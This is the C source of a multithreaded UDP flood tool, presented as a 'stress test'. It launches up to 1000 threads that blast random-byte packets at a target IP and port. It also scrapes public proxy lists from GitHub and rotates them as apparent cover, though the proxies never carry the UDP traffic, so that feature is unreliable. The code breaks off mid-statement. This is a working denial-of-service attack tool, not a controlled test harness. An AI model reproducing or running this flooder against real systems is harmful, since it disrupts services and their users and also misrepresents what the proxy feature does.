#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <stdatomic.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <curl/curl.h>
#include <fcntl.h>
#include <sched.h>

#define MAX_PAYLOADS 10
#define BATCH_SIZE 100
#define MAX_PROXIES 50000
#define MAX_LINE 1024
#define MAX_SOURCES 20

volatile atomic_int running = 1;

// Proxy structure
typedef struct {
    char ip[16];
    int port;
    char type[8];
    int working;
    int use_count;
    int speed; // milliseconds
} Proxy;

// Thread data structure
struct thread_data {
    char *target_ip;
    int target_port;
    int duration;
    int thread_id;
    Proxy *proxies;
    int proxy_count;
    int use_proxies;
    int rotate_interval;
};

// Global proxy list
Proxy *proxy_list = NULL;
int total_proxies = 0;
pthread_mutex_t proxy_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// Statistics
long long total_packets_sent = 0;
int active_threads = 0;

// Proxy sources for auto-discovery
const char *proxy_sources[] = {
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt"
};
int num_sources = sizeof(proxy_sources) / sizeof(proxy_sources[0]);

// Callback for curl write function
size_t write_callback(void *contents, size_t size, size_t nmemb, char **output) {
    size_t total_size = size * nmemb;
    *output = realloc(*output, strlen(*output) + total_size + 1);
    if (*output == NULL) return 0;
    memcpy(&(*output)[strlen(*output)], contents, total_size);
    (*output)[strlen(*output) + total_size] = '\0';
    return total_size;
}

// Fetch proxies from URL
char* fetch_url(const char *url) {
    CURL *curl;
    CURLcode res;
    char *data = malloc(1);
    data[0] = '\0';
    
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            free(data);
            data = NULL;
        }
        curl_easy_cleanup(curl);
    }
    return data;
}

// Parse proxy from line (format: ip:port or ip:port:type)
void parse_proxy_line(const char *line, const char *default_type) {
    char ip[16];
    int port;
    char type[8];
    
    // Try format with type
    if (sscanf(line, "%15[^:]:%d:%7s", ip, &port, type) == 3) {
        // Already has type
    }
    // Try format without type
    else if (sscanf(line, "%15[^:]:%d", ip, &port) == 2) {
        strncpy(type, default_type, sizeof(type) - 1);
        type[sizeof(type) - 1] = '\0';
    }
    else {
        return; // Invalid format
    }
    
    // Validate port
    if (port < 1 || port > 65535) return;
    
    // Check for duplicate
    pthread_mutex_lock(&proxy_mutex);
    for (int i = 0; i < total_proxies; i++) {
        if (strcmp(proxy_list[i].ip, ip) == 0 && proxy_list[i].port == port) {
            pthread_mutex_unlock(&proxy_mutex);
            return;
        }
    }
    
    // Add new proxy
    proxy_list = realloc(proxy_list, (total_proxies + 1) * sizeof(Proxy));
    if (proxy_list) {
        strcpy(proxy_list[total_proxies].ip, ip);
        proxy_list[total_proxies].port = port;
        strcpy(proxy_list[total_proxies].type, type);
        proxy_list[total_proxies].working = 1;
        proxy_list[total_proxies].use_count = 0;
        proxy_list[total_proxies].speed = 9999;
        total_proxies++;
    }
    pthread_mutex_unlock(&proxy_mutex);
}

// Auto-discover proxies from all sources
int auto_discover_proxies() {
    printf("[*] Auto-discovering proxies from %d sources...\n", num_sources);
    
    for (int i = 0; i < num_sources; i++) {
        printf("[*] Fetching from: %s\n", proxy_sources[i]);
        
        char *data = fetch_url(proxy_sources[i]);
        if (data) {
            // Determine proxy type from URL
            const char *proxy_type = "http";
            if (strstr(proxy_sources[i], "socks4")) proxy_type = "socks4";
            else if (strstr(proxy_sources[i], "socks5")) proxy_type = "socks5";
            
            // Parse each line
            char *line = strtok(data, "\n");
            while (line) {
                // Trim whitespace
                while (*line == ' ' || *line == '\r') line++;
                if (strlen(line) > 0) {
                    parse_proxy_line(line, proxy_type);
                }
                line = strtok(NULL, "\n");
            }
            free(data);
            printf("[+] Found %d proxies so far...\n", total_proxies);
        } else {
            printf("[!] Failed to fetch from: %s\n", proxy_sources[i]);
        }
        
        // Rate limiting
        usleep(500000);
    }
    
    return total_proxies;
}

// Test proxy speed
int test_proxy_speed(Proxy *proxy) {
    CURL *curl;
    CURLcode res;
    double speed;
    
    curl = curl_easy_init();
    if (!curl) return 9999;
    
    char proxy_url[64];
    snprintf(proxy_url, sizeof(proxy_url), "%s://%s:%d", 
             strcmp(proxy->type, "http") == 0 ? "http" : "socks5",
             proxy->ip, proxy->port);
    
    curl_easy_setopt(curl, CURLOPT_PROXY, proxy_url);
    curl_easy_setopt(curl, CURLOPT_URL, "http://httpbin.org/ip");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
    
    res = curl_easy_perform(curl);
    
    if (res == CURLE_OK) {
        curl_easy_getinfo(curl, CURLINFO_SPEED_DOWNLOAD, &speed);
        curl_easy_cleanup(curl);
        return (int)speed;
    }
    
    curl_easy_cleanup(curl);
    return 9999;
}

// Validate and sort proxies by speed
void validate_proxies() {
    printf("[*] Validating %d proxies (this may take a while)...\n", total_proxies);
    
    int max_to_test = total_proxies < 1000 ? total_proxies : 1000;
    
    for (int i = 0; i < max_to_test; i++) {
        if (i % 100 == 0) {
            printf("[*] Validating proxy %d/%d\n", i, max_to_test);
        }
        
        int speed = test_proxy_speed(&proxy_list[i]);
        if (speed >= 9999) {
            proxy_list[i].working = 0;
        } else {
            proxy_list[i].speed = speed;
            proxy_list[i].working = 1;
        }
        
        usleep(100000); // Rate limit
    }
    
    // Sort working proxies by speed
    for (int i = 0; i < total_proxies - 1; i++) {
        for (int j = i + 1; j < total_proxies; j++) {
            if (proxy_list[i].working && proxy_list[j].working && 
                proxy_list[i].speed > proxy_list[j].speed) {
                Proxy temp = proxy_list[i];
                proxy_list[i] = proxy_list[j];
                proxy_list[j] = temp;
            }
        }
    }
}

// Get random working proxy
Proxy* get_random_proxy() {
    if (total_proxies == 0) return NULL;
    
    pthread_mutex_lock(&proxy_mutex);
    
    int working_indices[total_proxies];
    int working_count = 0;
    
    for (int i = 0; i < total_proxies; i++) {
        if (proxy_list[i].working) {
            working_indices[working_count++] = i;
        }
    }
    
    Proxy *selected = NULL;
    if (working_count > 0) {
        int idx = working_indices[rand() % working_count];
        selected = &proxy_list[idx];
        selected->use_count++;
    }
    
    pthread_mutex_unlock(&proxy_mutex);
    return selected;
}

// Send UDP packet
int send_udp_packet(int sock, struct sockaddr_in *target_addr, char *payload, int payload_len) {
    return sendto(sock, payload, payload_len, 0,
                 (struct sockaddr*)target_addr, sizeof(*target_addr));
}

// Test function with proxy support
void *Testing(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in target_addr;
    time_t endtime;
    int sent_packets = 0;
    int errors = 0;
    time_t last_rotate = time(NULL);
    
    // Load payloads
    char payloads[MAX_PAYLOADS][256];
    int payload_lens[MAX_PAYLOADS];
    int payload_count = 0;
    
    // Default payloads
    const char *default_payloads[] = {
        "\x7D\x39\x19\x74\xA6\x7C\x20\xFC\x05\x0C\x9B\x9A\xD7\x31\x3F\x6B\x56\x95\x5B\x29",
        "\x99\xF5\x75\x25\x1D\x9E\xD8\x8E\x99\x7F\x60\xBB\xC2\xE2\x27\x43\xC8\xA0\x80\xC1",
        "\xF8\x01\x43\xF5\x0C\x2C\xE3\x4B\x5B\x71\x7E\x42\xFC\x27\x69\xE0\x3B\x8E\xFE\xC5",
        "\x1E\x09\x94\x1B\x0D\xBE\xE6\xEA\x68\x4F\x48\x5B\x21\xE9\x20\x94\xC6\xA8\xC9\x0E",
        "\xCC\x15\xFD\x3D\x49\x3C\x3C\xB7\xF1\x1B\xD9\xB5\xB3\x8C\x71\xA1\xA8\xFB\x02\xDE"
    };
    
    int default_count = sizeof(default_payloads) / sizeof(default_payloads[0]);
    for (int i = 0; i < default_count && i < MAX_PAYLOADS; i++) {
        strcpy(payloads[i], default_payloads[i]);
        payload_lens[i] = strlen(default_payloads[i]);
        payload_count++;
    }
    
    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }
    
    // Socket optimizations
    int optval = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    
    int buffer_size = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &target_addr.sin_addr);
    
    endtime = time(NULL) + data->duration;
    
    pthread_mutex_lock(&stats_mutex);
    active_threads++;
    pthread_mutex_unlock(&stats_mutex);
    
    printf("[Thread %d] Started with %d proxies available\n", 
           data->thread_id, data->proxy_count);
    
    // Main flooding loop
    while (atomic_load(&running) && time(NULL) <= endtime) {
        Proxy *current_proxy = NULL;
        
        if (data->use_proxies && data->proxy_count > 0) {
            current_proxy = get_random_proxy();
            
            // Rotate proxy if interval reached
            if (data->rotate_interval > 0 && 
                time(NULL) - last_rotate >= data->rotate_interval) {
                last_rotate = time(NULL);
                current_proxy = get_random_proxy();
            }
        }
        
        // Send batch of packets
        for (int batch = 0; batch < BATCH_SIZE && atomic_load(&running); batch++) {
            int payload_idx = rand() % payload_count;
            
            ssize_t result = send_udp_packet(sock, &target_addr, 
                                            payloads[payload_idx], 
                                            payload_lens[payload_idx]);
            
            if (result < 0) {
                errors++;
                if (current_proxy && errors > 10) {
                    pthread_mutex_lock(&proxy_mutex);
                    current_proxy->working = 0;
                    pthread_mutex_unlock(&proxy_mutex);
                }
            } else {
                sent_packets++;
                errors = 0;
            }
        }
        
        sched_yield();
    }
    
    pthread_mutex_lock(&stats_mutex);
    total_packets_sent += sent_packets;
    active_threads--;
    pthread_mutex_unlock(&stats_mutex);
    
    printf("[Thread %d] Finished: Sent %d packets, Errors: %d\n", 
           data->thread_id, sent_packets, errors);
    
    close(sock);
    pthread_exit(NULL);
}

// Statistics display thread
void *stats_display(void *arg) {
    int duration = *(int*)arg;
    time_t start = time(NULL);
    
    while (atomic_load(&running) && time(NULL) - start < duration) {
        sleep(5);
        pthread_mutex_lock(&stats_mutex);
        printf("\n[STATS] Total packets: %lld | Active threads: %d | Proxies: %d\n", 
               total_packets_sent, active_threads, total_proxies);
        pthread_mutex_unlock(&stats_mutex);
    }
    
    return NULL;
}

void usage() {
    printf("Usage: ./safe <target_ip> <port> <duration_seconds> <threads> [options]\n");
    printf("\nOptions:\n");
    printf("  --auto-proxy           Automatically discover and use proxies\n");
    printf("  --proxy-file <file>    Load proxies from file\n");
    printf("  --proxy-list <list>    Comma-separated proxies (ip:port,ip:port)\n");
    printf("  --rotate <seconds>     Rotate proxies every N seconds\n");
    printf("  --validate             Validate proxy speed before use\n");
    printf("\nExamples:\n");
    printf("  ./safe 192.168.1.1 80 60 100 --auto-proxy\n");
    printf("  ./safe 192.168.1.1 80 900 500 --auto-proxy --rotate 30\n");
    printf("  ./safe 192.168.1.1 80 60 100 --proxy-file proxies.txt --validate\n");
    exit(1);
}

void signal_handler(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        printf("\n[!] Stopping test...\n");
        atomic_store(&running, 0);
    }
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    if (argc < 5) {
        usage();
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);
    
    // Parse optional arguments
    int auto_proxy = 0;
    char *proxy_file = NULL;
    char *proxy_list_str = NULL;
    int rotate_interval = 0;
    int validate = 0;
    
    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--auto-proxy") == 0) {
            auto_proxy = 1;
        } else if (strcmp(argv[i], "--proxy-file") == 0 && i + 1 < argc) {
            proxy_file = argv[++i];
        } else if (strcmp(argv[i], "--proxy-list") == 0 && i + 1 < argc) {
            proxy_list_str = argv[++i];
        } else if (strcmp(argv[i], "--rotate") == 0 && i + 1 < argc) {
            rotate_interval = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--validate") == 0) {
            validate = 1;
        }
    }
    
    // Initialize curl
    curl_global_init(CURL_GLOBAL_ALL);
    
    // Auto-discover proxies
    if (auto_proxy) {
        printf("\n========================================\n");
        printf("Auto-Proxy Discovery Mode\n");
        printf("========================================\n");
        auto_discover_proxies();
        
        if (validate && total_proxies > 0) {
            validate_proxies();
        }
        
        printf("[+] Total proxies discovered: %d\n", total_proxies);
        
        // Count working proxies
        int working = 0;
        for (int i = 0; i < total_proxies; i++) {
            if (proxy_list[i].working) working++;
        }
        printf("[+] Working proxies: %d\n", working);
    }
    
    // Load from file (if specified)
    if (proxy_file) {
        FILE *file = fopen(proxy_file, "r");
        if (file) {
            char line[MAX_LINE];
            while (fgets(line, sizeof(line), file)) {
                line[strcspn(line, "\n")] = 0;
                parse_proxy_line(line, "http");
            }
            fclose(file);
            printf("[+] Loaded %d proxies from file\n", total_proxies);
        }
    }
    
    // Validate inputs
    if (target_port < 1 || target_port > 65535) {
        fprintf(stderr, "Error: Invalid port\n");
        exit(1);
    }
    
    if (duration < 1 || duration > 3600) {
        fprintf(stderr, "Error: Invalid duration (1-3600 seconds)\n");
        exit(1);
    }
    
    if (thread_count < 1 || thread_count > 1000) {
        fprintf(stderr, "Error: Invalid thread count (1-1000)\n");
        exit(1);
    }
    
    srand(time(NULL) ^ (getpid() << 16));
    
    pthread_t *thread_ids = malloc(thread_count * sizeof(pthread_t));
    struct thread_data *threads_data = malloc(thread_count * sizeof(struct thread_data));
    pthread_t stats_thread;
    
    if (!thread_ids || !threads_data) {
        fprintf(stderr, "Memory allocation failed\n");
        exit(1);
    }
    
    printf("\n========================================\n");
    printf("UDP Stress Test - Auto-Proxy Edition\n");
    printf("========================================\n");
    printf("Target: %s:%d\n", target_ip, target_port);
    printf("Duration: %d seconds\n", duration);
    printf("Threads: %d\n", thread_count);
    printf("Proxies: %d\n", total_proxies);
    if (rotate_interval > 0) {
        printf("Proxy rotation: Every %d seconds\n", rotate_interval);
    }
    printf("========================================\n");
    printf("[!] Press Ctrl+C to stop early\n\n");
    
    // Create statistics thread
    pthread_create(&stats_thread, NULL, stats_display, &duration);
    
    // Create attack threads
    for (int i = 0; i < thread_count; i++) {
        threads_data[i].target_ip = target_ip;
        threads_data[i].target_port = target_port;
        threads_data[i].duration = duration;
        threads_data[i].thread_id = i;
        threads_data[i].proxies = proxy_list;
        threads_data[i].proxy_count = total_proxies;
        threads_data[i].use_proxies = (total_proxies > 0);
        threads_data[i].rotate_interval = rotate_interval;
        
        if (pthread_create(&thread_ids[i], NULL, Testing, (void *)&threads_data[i]) != 0) {
            perror("Thread creation failed");
            for (int j = 0; j < i; j++) {
                pthread_cancel(thread_ids[j]);
                pthread_join(thread_ids[j], NULL);
            }
            free(thread_ids);
            free(threads_data);
            exit(1);
        }
        printf("[Main] Launched thread %d\n", i);
        usleep(10000); // Small delay between thread creation
    }
    
    // Wait for completion
    for (int i = 0; i < thread_count; i++) {
        pthread_join(thread_ids[i], NULL);
    }
    
    atomic_store(&running, 0);
    pthread_join(stats_thread, NULL);
    
    // Print proxy usage statistics
    if (total_proxies > 0) {
        printf("\n========================================\n");
        printf("Proxy Usage Statistics:\n");
        int total_uses = 0;
        int working_count = 0;
        for (int i = 0; i < total_proxies && i < 100; i++) {
            total_uses += proxy_list[i].use_count;
            if (proxy_list[i].working) working_count++;
            if (proxy_list[i].use_count > 0) {
                printf("  %s:%d - %d uses (speed: %dms) %s\n", 
                       proxy_list[i].ip, proxy_li
